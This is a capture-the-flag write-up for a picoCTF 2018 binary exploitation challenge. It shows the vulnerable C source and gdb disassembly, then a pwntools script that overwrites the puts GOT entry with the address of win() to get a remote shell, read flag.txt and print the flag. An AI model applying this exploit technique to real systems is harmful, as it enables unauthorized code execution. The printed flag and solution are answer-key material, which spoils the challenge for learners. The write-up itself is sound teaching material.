# Problem
Can you authenticate to this [service](https://2018shell1.picoctf.com/static/c65c74a0f13131ba9f0b9497152aedd4/auth) and get the flag? Connect to it with ```nc 2018shell1.picoctf.com 23731```. [Source](https://2018shell1.picoctf.com/static/c65c74a0f13131ba9f0b9497152aedd4/auth.c)

## Hints:
Ever heard of the Global Offset Table?

## Solution:
First we download the files:
```bash
wget https://2018shell1.picoctf.com/static/c65c74a0f13131ba9f0b9497152aedd4/auth
wget https://2018shell1.picoctf.com/static/c65c74a0f13131ba9f0b9497152aedd4/auth.c
chmod +x ./auth
```

Now, we investigate the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

void win() {
  system("/bin/sh");
}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[256];
  
  unsigned int address;
  unsigned int value;

  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");

  scanf("%x", &address);

  sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
  puts(buf);
  
  scanf("%x", &value);

  sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
  puts(buf);

  *(unsigned int *)address = value;

  puts("Okay, exiting now...\n");
  exit(1);
  
}
```

They let us change one word in memory as we wish.

The hint suggests to use the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table).

If we override the address of ```puts@got()``` to ```win()```, we will have a shell.

Lets find some addresses:
```bash
gdb ./auth

gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048564 <+0>:	lea    ecx,[esp+0x4]
   0x08048568 <+4>:	and    esp,0xfffffff0
   0x0804856b <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804856e <+10>:	push   ebp
   0x0804856f <+11>:	mov    ebp,esp
   0x08048571 <+13>:	push   ecx
   0x08048572 <+14>:	sub    esp,0x124
   0x08048578 <+20>:	mov    eax,ecx
   0x0804857a <+22>:	mov    eax,DWORD PTR [eax+0x4]
   0x0804857d <+25>:	mov    DWORD PTR [ebp-0x11c],eax
   0x08048583 <+31>:	mov    eax,gs:0x14
   0x08048589 <+37>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804858c <+40>:	xor    eax,eax
   0x0804858e <+42>:	mov    eax,ds:0x804a030
   0x08048593 <+47>:	push   0x0
   0x08048595 <+49>:	push   0x2
   0x08048597 <+51>:	push   0x0
   0x08048599 <+53>:	push   eax
   0x0804859a <+54>:	call   0x8048410 <setvbuf@plt>
   0x0804859f <+59>:	add    esp,0x10
   0x080485a2 <+62>:	sub    esp,0xc
   0x080485a5 <+65>:	push   0x80486f8
   0x080485aa <+70>:	call   0x80483d0 <puts@plt>
   0x080485af <+75>:	add    esp,0x10
   0x080485b2 <+78>:	sub    esp,0x8
   0x080485b5 <+81>:	lea    eax,[ebp-0x114]
   0x080485bb <+87>:	push   eax
   0x080485bc <+88>:	push   0x8048758
   0x080485c1 <+93>:	call   0x8048430 <__isoc99_scanf@plt>
   0x080485c6 <+98>:	add    esp,0x10
   0x080485c9 <+101>:	mov    eax,DWORD PTR [ebp-0x114]
   0x080485cf <+107>:	sub    esp,0x4
   0x080485d2 <+110>:	push   eax
   0x080485d3 <+111>:	push   0x804875c
   0x080485d8 <+116>:	lea    eax,[ebp-0x10c]
   0x080485de <+122>:	push   eax
   0x080485df <+123>:	call   0x8048420 <sprintf@plt>
   0x080485e4 <+128>:	add    esp,0x10
   0x080485e7 <+131>:	sub    esp,0xc
   0x080485ea <+134>:	lea    eax,[ebp-0x10c]
   0x080485f0 <+140>:	push   eax
   0x080485f1 <+141>:	call   0x80483d0 <puts@plt>
   0x080485f6 <+146>:	add    esp,0x10
   0x080485f9 <+149>:	sub    esp,0x8
   0x080485fc <+152>:	lea    eax,[ebp-0x110]
   0x08048602 <+158>:	push   eax
   0x08048603 <+159>:	push   0x8048758
   0x08048608 <+164>:	call   0x8048430 <__isoc99_scanf@plt>
   0x0804860d <+169>:	add    esp,0x10
   0x08048610 <+172>:	mov    edx,DWORD PTR [ebp-0x114]
   0x08048616 <+178>:	mov    eax,DWORD PTR [ebp-0x110]
   0x0804861c <+184>:	push   edx
   0x0804861d <+185>:	push   eax
   0x0804861e <+186>:	push   0x8048791
   0x08048623 <+191>:	lea    eax,[ebp-0x10c]
   0x08048629 <+197>:	push   eax
   0x0804862a <+198>:	call   0x8048420 <sprintf@plt>
   0x0804862f <+203>:	add    esp,0x10
   0x08048632 <+206>:	sub    esp,0xc
   0x08048635 <+209>:	lea    eax,[ebp-0x10c]
   0x0804863b <+215>:	push   eax
   0x0804863c <+216>:	call   0x80483d0 <puts@plt>
   0x08048641 <+221>:	add    esp,0x10
   0x08048644 <+224>:	mov    eax,DWORD PTR [ebp-0x114]
   0x0804864a <+230>:	mov    edx,eax
   0x0804864c <+232>:	mov    eax,DWORD PTR [ebp-0x110]
   0x08048652 <+238>:	mov    DWORD PTR [edx],eax
   0x08048654 <+240>:	sub    esp,0xc
   0x08048657 <+243>:	push   0x80487ac
   0x0804865c <+248>:	call   0x80483d0 <puts@plt>
   0x08048661 <+253>:	add    esp,0x10
   0x08048664 <+256>:	sub    esp,0xc
   0x08048667 <+259>:	push   0x1
   0x08048669 <+261>:	call   0x80483f0 <exit@plt>
End of assembler dump.
gdb-peda$ x/i 0x80483d0
   0x80483d0 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c
gdb-peda$ x/w 0x804a00c
0x804a00c:	0x080483d6
gdb-peda$ x win
0x804854b <win>:	0x83e58955
gdb-peda$ quit
```

We just need to override ```0x804a00c``` with ```0x804854b```.

Lets code:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''

if debug:
  p = process('./auth')
else:
  p = remote('2018shell1.picoctf.com', 23731)

print p.recvuntil('Where would you like to write this 4 byte value?')
p.sendline('0x804a00c')
print p.recvuntil('Okay, now what value would you like to write to 0x804a00c')
p.sendline('0x804854b')

p.sendline('ls')
p.sendline('cat flag.txt')
p.sendline('exit')

print p.recvall()
```

We have shell!

Flag: picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81}